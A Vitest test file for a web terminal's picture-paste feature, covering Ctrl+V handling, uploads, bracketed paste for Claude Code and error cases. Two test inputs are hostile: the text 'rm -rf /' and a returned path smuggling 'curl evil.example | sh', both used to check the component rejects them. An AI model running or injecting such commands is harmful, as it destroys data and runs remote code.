import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, createEvent, fireEvent, render, screen, waitFor } from "@/tests/helpers/test-utils";
import TerminalApp from "@/components/TerminalApp";
import { resetTerminalSettingsStoreForTests } from "@/lib/terminal-settings";
import { TERMINAL_PASTE_MAX_BYTES, TERMINAL_PASTE_ROUTE } from "@/lib/terminal-paste";

/**
 * Pasting a PICTURE into the Terminal.
 *
 * A terminal carries text, so the picture is saved on the box and its path is
 * what gets pasted — as a paste, which is what makes Claude Code attach the
 * file. The key is plain Ctrl+V, because that is the only one on which a
 * browser hands the page a picture (Ctrl+Shift+V is "paste as plain text"),
 * and it stays the shell's ^V every time the clipboard holds no picture — and
 * every time the program in front is not one that takes pictures: vim and
 * nano accept pastes exactly as a prompt does, and Ctrl+V is their key.
 */

interface Frame { type: string; data?: string }
const sent: Frame[] = [];
const sockets: { readyState: number; onmessage: ((ev: { data: string }) => void) | null }[] = [];
const CTRL_V = "\x16";
/**
 * The box's answer to "may a picture go to what is in front?" — decided there,
 * from the processes (terminal-foreground.test.ts). `undefined`: a server that
 * never answers.
 */
let foreground: "claude" | "shell" | null | undefined = "claude";
/** Hold the box's answer back until a test lets it go. */
let holdForeground = false;
const heldAnswers: (() => void)[] = [];
let foregroundAsked = 0;
const SAVED = "/home/clawbox/.cache/clawbox/terminal-paste/paste-20261011-193355-1a2b3c4d.png";

interface FakeTerm {
  paste: ReturnType<typeof vi.fn>;
  modes: { bracketedPasteMode: boolean };
  press: (ev: Partial<KeyboardEvent>) => boolean | undefined;
  prevented: number;
}
const terms: FakeTerm[] = [];
let bracketed = true;

vi.mock("@xterm/xterm", () => ({
  Terminal: class {
    constructor(options: Record<string, unknown>) {
      let handler: ((ev: KeyboardEvent) => boolean) | null = null;
      const term = {
        cols: 80, rows: 24, options: { ...options }, prevented: 0,
        get modes() { return { bracketedPasteMode: bracketed }; },
        loadAddon: () => {}, open: () => {}, focus: () => {}, write: () => {}, writeln: () => {}, dispose: () => {},
        clear: () => {}, getSelection: () => "", paste: vi.fn(),
        onData: () => ({ dispose: () => {} }),
        onBell: () => ({ dispose: () => {} }),
        attachCustomKeyEventHandler: (fn: (ev: KeyboardEvent) => boolean) => { handler = fn; },
        press: (ev: Partial<KeyboardEvent>) => handler?.({ type: "keydown", preventDefault: () => { term.prevented++; }, ...ev } as KeyboardEvent),
      };
      terms.push(term as unknown as FakeTerm);
      return term as unknown as object;
    }
  },
}));
vi.mock("@xterm/addon-fit", () => ({ FitAddon: class { fit() {} } }));
vi.mock("@xterm/addon-web-links", () => ({ WebLinksAddon: class {} }));
vi.mock("@xterm/addon-unicode11", () => ({ Unicode11Addon: class {} }));
vi.mock("@xterm/xterm/css/xterm.css", () => ({}));

/** What the paste route answers; a test may swap it, or hold it open. */
let answer: () => Promise<Response>;
const uploads: { url: string; init: RequestInit }[] = [];

const picture = (name = "image.png", type = "image/png") => new File([new Uint8Array([0x89, 0x50, 0x4e, 0x47])], name, { type });

/** A paste event as a browser builds one. */
function clipboard({ images = [], text = "" }: { images?: File[]; text?: string }) {
  const types = [...(text ? ["text/plain"] : []), ...(images.length ? ["Files"] : [])];
  return {
    types,
    items: images.map((file) => ({ kind: "file", type: file.type, getAsFile: () => file })),
    files: images,
    getData: (format: string) => (format === "text/plain" ? text : ""),
  };
}

/** Fire a paste at the terminal; answers whether the Terminal took it from xterm and the browser. */
function paste(data: ReturnType<typeof clipboard>): boolean {
  const surface = screen.getByTestId("terminal-surface");
  const event = createEvent.paste(surface, { clipboardData: data });
  act(() => { fireEvent(surface, event); });
  return event.defaultPrevented;
}

const ctrlV = { ctrlKey: true, shiftKey: false, altKey: false, metaKey: false, key: "v", code: "KeyV" };
const inputs = () => sent.filter((f) => f.type === "input").map((f) => f.data);
/** The saved path as Claude Code is sent it: marked as a paste. */
const asPaste = (text: string) => `\x1b[200~${text}\x1b[201~`;
const releaseForeground = () => act(() => { for (const answer of heldAnswers.splice(0)) answer(); });

async function mount() {
  render(<TerminalApp />);
  await waitFor(() => expect(terms.length).toBe(1));
  await waitFor(() => expect(sockets.length).toBe(1));
  return terms[0];
}

beforeEach(() => {
  sent.length = 0;
  terms.length = 0;
  sockets.length = 0;
  uploads.length = 0;
  bracketed = true;
  foreground = "claude";
  holdForeground = false;
  heldAnswers.length = 0;
  foregroundAsked = 0;
  answer = async () => new Response(JSON.stringify({ ok: true, path: SAVED }), { status: 201 });
  resetTerminalSettingsStoreForTests();
  vi.stubGlobal("fetch", vi.fn(async (url: string, init: RequestInit = {}) => {
    if (url === TERMINAL_PASTE_ROUTE) {
      uploads.push({ url, init });
      return answer();
    }
    return new Response("{}");
  }));
  const WebSocketStub = function () {
    const socket = {
      readyState: 1,
      send: (raw: string) => {
        const frame = JSON.parse(raw) as Frame & { id?: number };
        sent.push(frame);
        // The PTY server's side of the `foreground` question.
        if (frame.type !== "foreground") return;
        foregroundAsked++;
        if (foreground === undefined) return;
        const taker = foreground;
        const reply = () => socket.onmessage?.({ data: JSON.stringify({ type: "foreground", id: frame.id, taker, name: "x" }) });
        if (holdForeground) heldAnswers.push(reply);
        else queueMicrotask(reply);
      },
      close() {}, onopen: null, onmessage: null as ((ev: { data: string }) => void) | null, onclose: null, onerror: null,
    };
    sockets.push(socket);
    return socket;
  } as unknown as typeof WebSocket;
  (WebSocketStub as unknown as { OPEN: number }).OPEN = 1;
  vi.stubGlobal("WebSocket", WebSocketStub);
  vi.stubGlobal("ResizeObserver", class { observe() {} unobserve() {} disconnect() {} });
});

afterEach(() => {
  resetTerminalSettingsStoreForTests();
  vi.unstubAllGlobals();
});

describe("a picture on Ctrl+V", () => {
  it("lets the browser have the key, so its paste event can show what the clipboard holds", async () => {
    const term = await mount();
    // `false`: xterm types nothing. No preventDefault: the browser pastes.
    expect(term.press(ctrlV)).toBe(false);
    expect(term.prevented).toBe(0);
    // Nothing has reached the shell yet — the paste event decides.
    expect(inputs()).toEqual([]);
  });

  it("saves the picture on the box and sends Claude Code its path, marked as a paste", async () => {
    const term = await mount();
    const file = picture();
    term.press(ctrlV);
    expect(paste(clipboard({ images: [file] }))).toBe(true);

    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    expect(uploads).toHaveLength(1);
    expect(uploads[0].init).toMatchObject({ method: "POST", body: file, headers: { "content-type": "image/png" } });
    // The shell got no ^V on top of the picture, then or later.
    await new Promise((r) => setTimeout(r, 200));
    expect(inputs()).toEqual([asPaste(SAVED)]);
  });

  it("marks the paste for Claude Code whatever xterm believes the mode is", async () => {
    // After a reattach xterm's own flag is back at its default while Claude
    // Code still reads pastes as pastes: typed characters would stay a path.
    bracketed = false;
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("gives a shell at its prompt the path through xterm's own paste", async () => {
    foreground = "shell";
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    // xterm decides the markers there: a shell that asked for none gets none.
    await waitFor(() => expect(term.paste).toHaveBeenCalledWith(SAVED));
    expect(term.paste).toHaveBeenCalledTimes(1);
    expect(inputs()).toEqual([]);
  });

  it("says it is working while the picture is on its way, and stops saying so once it is in", async () => {
    await mount();
    let release: (res: Response) => void = () => {};
    answer = () => new Promise<Response>((resolve) => { release = resolve; });
    terms[0].press(ctrlV);
    paste(clipboard({ images: [picture()] }));

    expect(await screen.findByTestId("terminal-notice")).toHaveTextContent("Pasting the picture…");
    // Not a notice that times out: an upload takes as long as it takes.
    await new Promise((r) => setTimeout(r, 1800));
    expect(screen.getByTestId("terminal-notice")).toHaveTextContent("Pasting the picture…");
    expect(inputs()).toEqual([]);

    await act(async () => { release(new Response(JSON.stringify({ ok: true, path: SAVED }), { status: 201 })); });
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    await waitFor(() => expect(screen.queryByTestId("terminal-notice")).not.toBeInTheDocument());
  });

  it("wins over text on the same clipboard: Ctrl+V is never the text paste", async () => {
    const term = await mount();
    term.press(ctrlV);
    expect(paste(clipboard({ images: [picture()], text: "a caption" }))).toBe(true);
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("pastes several pictures as paths on one line", async () => {
    const term = await mount();
    const second = SAVED.replace("1a2b3c4d", "5e6f7a8b");
    const paths = [SAVED, second];
    answer = async () => new Response(JSON.stringify({ ok: true, path: paths[uploads.length - 1] }), { status: 201 });
    term.press(ctrlV);
    paste(clipboard({ images: [picture("a.png"), picture("b.png")] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(`${SAVED} ${second}`)]));
    expect(uploads).toHaveLength(2);
  });

  it("is one paste for a key held down, and for a second press while the first is going in", async () => {
    const term = await mount();
    let release: (res: Response) => void = () => {};
    answer = () => new Promise<Response>((resolve) => { release = resolve; });
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(uploads).toHaveLength(1));
    // Auto-repeat, then an impatient second press: nothing appeared yet.
    for (let i = 0; i < 5; i++) {
      term.press({ ...ctrlV, repeat: true });
      paste(clipboard({ images: [picture()] }));
    }
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));

    await act(async () => { release(new Response(JSON.stringify({ ok: true, path: SAVED }), { status: 201 })); });
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    await new Promise((r) => setTimeout(r, 200));
    expect(uploads).toHaveLength(1);
    expect(inputs()).toEqual([asPaste(SAVED)]);
  });

  it("does not start a second paste from a repeat that lands after the first is in", async () => {
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    term.press({ ...ctrlV, repeat: true });
    paste(clipboard({ images: [picture()] }));
    await new Promise((r) => setTimeout(r, 200));
    expect(uploads).toHaveLength(1);
    expect(inputs()).toEqual([asPaste(SAVED)]);
  });
});

describe("Ctrl+V stays the shell's key", () => {
  it("gives the shell its ^V when the clipboard holds text — and pastes none of it", async () => {
    const term = await mount();
    term.press(ctrlV);
    // Taken from xterm and the browser: Ctrl+V has never pasted text here.
    expect(paste(clipboard({ text: "rm -rf /" }))).toBe(true);
    expect(inputs()).toEqual([CTRL_V]);
    expect(term.paste).not.toHaveBeenCalled();
    expect(uploads).toHaveLength(0);
    // With no picture there is nothing to ask the box about.
    expect(foregroundAsked).toBe(0);
    // Exactly one: the fallback timer does not send a second.
    await new Promise((r) => setTimeout(r, 200));
    expect(inputs()).toEqual([CTRL_V]);
  });

  it.each([true, false])(
    "gives the program its ^V with a picture on the clipboard when the box says no (bracketed paste %s)",
    async (mode) => {
      // An editor, a pager, a script — or a box that cannot say. vim and nano
      // turn bracketed paste on exactly as a prompt does, so the mode makes no
      // difference: a path pasted there lands in the document, and Ctrl+V is
      // block select and next page.
      bracketed = mode;
      foreground = null;
      const term = await mount();
      term.press(ctrlV);
      expect(paste(clipboard({ images: [picture()] }))).toBe(true);
      await waitFor(() => expect(inputs()).toEqual([CTRL_V]));
      expect(uploads).toHaveLength(0);
      expect(term.paste).not.toHaveBeenCalled();
      expect(screen.queryByTestId("terminal-notice")).not.toBeInTheDocument();
    },
  );

  it("takes no answer but the box's two for a yes", async () => {
    // A name is not an answer: the box decides, the page does not guess.
    foreground = "bash" as unknown as "shell";
    await mount();
    terms[0].press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([CTRL_V]));
    expect(uploads).toHaveLength(0);
  });

  it("gives the shell its ^V when the server never answers the question", async () => {
    // A PTY server from before the question existed.
    foreground = undefined;
    await mount();
    terms[0].press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    expect(inputs()).toEqual([]);
    await waitFor(() => expect(inputs()).toEqual([CTRL_V]), { timeout: 2000 });
    expect(uploads).toHaveLength(0);
  });

  it("asks the box again once anything has been sent to the shell: the last answer was about what was running THEN", async () => {
    // A picture goes into Claude Code; the owner opens an editor from it and
    // presses Ctrl+V there a moment later, the picture still on the clipboard.
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    expect(foregroundAsked).toBe(1);

    foreground = null;
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED), CTRL_V]));
    // Asked afresh, well inside the time an answer is otherwise reused for.
    expect(foregroundAsked).toBe(2);
    expect(uploads).toHaveLength(1);
  });

  it("asks the box once for a key held down in an editor, and gives every repeat its ^V", async () => {
    foreground = null;
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    for (let i = 0; i < 4; i++) {
      term.press({ ...ctrlV, repeat: true });
      paste(clipboard({ images: [picture()] }));
    }
    await waitFor(() => expect(inputs()).toEqual([CTRL_V, CTRL_V, CTRL_V, CTRL_V, CTRL_V]));
    expect(foregroundAsked).toBe(1);
    expect(uploads).toHaveLength(0);
  });

  it("gives the shell its ^V when the browser fires no paste event at all", async () => {
    const term = await mount();
    term.press(ctrlV);
    expect(inputs()).toEqual([]);
    await waitFor(() => expect(inputs()).toEqual([CTRL_V]));
  });

  it("sends the ^V ahead of the next key, in the order they were typed", async () => {
    const term = await mount();
    term.press(ctrlV);
    // readline's quoted insert: Ctrl+V, then the key to insert literally.
    expect(term.press({ key: "Tab", code: "Tab" })).toBe(true);
    expect(inputs()).toEqual([CTRL_V]);
    await new Promise((r) => setTimeout(r, 200));
    expect(inputs()).toEqual([CTRL_V]);
  });

  it("sends the ^V ahead of the next key even while the box is still being asked", async () => {
    // A picture on the clipboard, the answer slow to come (a tunnel): the
    // owner types on. That press was the shell's key, and stays in order.
    holdForeground = true;
    const term = await mount();
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    expect(inputs()).toEqual([]);
    expect(term.press({ key: "Tab", code: "Tab" })).toBe(true);
    expect(inputs()).toEqual([CTRL_V]);
    // The late answer says Claude Code: too late, the key was given back.
    releaseForeground();
    await new Promise((r) => setTimeout(r, 200));
    expect(inputs()).toEqual([CTRL_V]);
    expect(uploads).toHaveLength(0);
  });

  it("does not count letting go of Ctrl, or a key coming up, as the next key", async () => {
    const term = await mount();
    term.press(ctrlV);
    term.press({ ...ctrlV, type: "keyup" });
    term.press({ type: "keyup", key: "Control", code: "ControlLeft" });
    term.press({ key: "Shift", code: "ShiftLeft", shiftKey: true });
    expect(inputs()).toEqual([]);
    // The picture can still arrive.
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
  });

  it("gives each press of a held Ctrl+V its own ^V", async () => {
    const term = await mount();
    term.press(ctrlV);
    term.press({ ...ctrlV, repeat: true });
    term.press({ ...ctrlV, repeat: true });
    await waitFor(() => expect(inputs()).toEqual([CTRL_V, CTRL_V, CTRL_V]));
  });
});

describe("a paste asked for as one (Ctrl+Shift+V, ⌘V, a middle click)", () => {
  it("leaves text to xterm exactly as before", async () => {
    const term = await mount();
    expect(term.press({ ctrlKey: true, shiftKey: true, key: "V", code: "KeyV" })).toBe(false);
    expect(paste(clipboard({ text: "echo hi" }))).toBe(false);
    expect(uploads).toHaveLength(0);
    expect(inputs()).toEqual([]);
    // The mock has no xterm paste listener; the Terminal itself pasted nothing.
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("pastes the text when the clipboard holds both: that is what was asked for", async () => {
    const term = await mount();
    expect(paste(clipboard({ images: [picture()], text: "echo hi" }))).toBe(false);
    expect(uploads).toHaveLength(0);
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("pastes a picture when that is all there is, whatever is running: this was asked for as a paste", async () => {
    foreground = null;
    const term = await mount();
    expect(paste(clipboard({ images: [picture()] }))).toBe(true);
    await waitFor(() => expect(term.paste).toHaveBeenCalledWith(SAVED));
    expect(inputs()).toEqual([]);
  });

  it("marks it for Claude Code there too", async () => {
    const term = await mount();
    expect(paste(clipboard({ images: [picture()] }))).toBe(true);
    await waitFor(() => expect(inputs()).toEqual([asPaste(SAVED)]));
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("names the key that carries a picture when the event shows nothing at all", async () => {
    // What Ctrl+Shift+V looks like with a picture on the clipboard: the
    // browser pastes "as plain text" and strips everything else.
    const term = await mount();
    expect(paste(clipboard({}))).toBe(true);
    expect(await screen.findByTestId("terminal-notice")).toHaveTextContent("To paste a picture, press Ctrl+V");
    expect(term.paste).not.toHaveBeenCalled();
    expect(inputs()).toEqual([]);
  });
});

describe("a picture that does not go in", () => {
  async function refused(response: () => Promise<Response>) {
    const term = await mount();
    answer = response;
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    return term;
  }
  const refusal = (status: number, code: string) => async () => new Response(JSON.stringify({ error: "no", code }), { status });

  it.each([
    ["not_an_image", 415, "Only PNG, JPEG, GIF and WebP"],
    ["disk_full", 507, "no room left"],
    ["write_failed", 500, "could not be pasted"],
  ])("says why, in a sentence, for %s — and pastes nothing", async (code, status, words) => {
    const term = await refused(refusal(status, code));
    expect(await screen.findByText(new RegExp(words))).toBeInTheDocument();
    expect(term.paste).not.toHaveBeenCalled();
    // Not the shell's ^V either: the owner asked for a picture.
    expect(inputs()).toEqual([]);
  });

  it("gives another user's shell its ^V back: their Terminal cannot be given pictures, and the key must not go dead", async () => {
    // A non-owner's shell runs under another account that could not read the
    // file; the box refuses the upload. Ctrl+V is still their shell's key.
    foreground = "shell";
    const term = await refused(refusal(403, "owner_only"));
    expect(await screen.findByText(/owner's Terminal only/)).toBeInTheDocument();
    expect(inputs()).toEqual([CTRL_V]);
    expect(term.paste).not.toHaveBeenCalled();

    // Learnt: the next press is the shell's at once, with no second upload.
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    expect(inputs()).toEqual([CTRL_V, CTRL_V]);
    expect(uploads).toHaveLength(1);
  });

  it("says a picture is too large before sending it", async () => {
    const term = await mount();
    const big = picture();
    Object.defineProperty(big, "size", { value: TERMINAL_PASTE_MAX_BYTES + 1 });
    term.press(ctrlV);
    paste(clipboard({ images: [big] }));
    expect(await screen.findByText(/too large to paste here \(the limit is 9 MB\)/)).toBeInTheDocument();
    expect(uploads).toHaveLength(0);
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("types nothing a shell could run, whatever the answer claims the path is", async () => {
    const term = await refused(async () => new Response(JSON.stringify({ ok: true, path: "/tmp/a.png; curl evil.example | sh #.png" }), { status: 201 }));
    expect(await screen.findByText(/could not be pasted/)).toBeInTheDocument();
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("says so when the box cannot be reached", async () => {
    const term = await refused(async () => { throw new TypeError("Failed to fetch"); });
    expect(await screen.findByText(/could not be pasted/)).toBeInTheDocument();
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("says the shell is gone rather than paste into a closed socket", async () => {
    const term = await mount();
    let release: (res: Response) => void = () => {};
    answer = () => new Promise<Response>((resolve) => { release = resolve; });
    term.press(ctrlV);
    paste(clipboard({ images: [picture()] }));
    await waitFor(() => expect(uploads).toHaveLength(1));
    sockets[0].readyState = 3;
    await act(async () => { release(new Response(JSON.stringify({ ok: true, path: SAVED }), { status: 201 })); });
    expect(await screen.findByText(/shell is not connected/)).toBeInTheDocument();
    expect(term.paste).not.toHaveBeenCalled();
  });

  it("pastes none of several pictures when one of them is refused", async () => {
    const term = await mount();
    answer = async () => (uploads.length === 1
      ? new Response(JSON.stringify({ ok: true, path: SAVED }), { status: 201 })
      : new Response(JSON.stringify({ code: "not_an_image" }), { status: 415 }));
    term.press(ctrlV);
    paste(clipboard({ images: [picture("a.png"), picture("b.png")] }));
    expect(await screen.findByText(/Only PNG, JPEG, GIF and WebP/)).toBeInTheDocument();
    expect(term.paste).not.toHaveBeenCalled();
  });
});

describe("leaving", () => {
  it("owes the shell nothing once the terminal is gone", async () => {
    const { unmount } = render(<TerminalApp />);
    await waitFor(() => expect(terms.length).toBe(1));
    await waitFor(() => expect(sockets.length).toBe(1));
    terms[0].press(ctrlV);
    // Closed with the ^V still waiting on a paste event: its timer is taken
    // down with the terminal, not left to fire at whatever shell comes next.
    unmount();
    await new Promise((r) => setTimeout(r, 200));
    expect(inputs()).toEqual([]);
  });
});
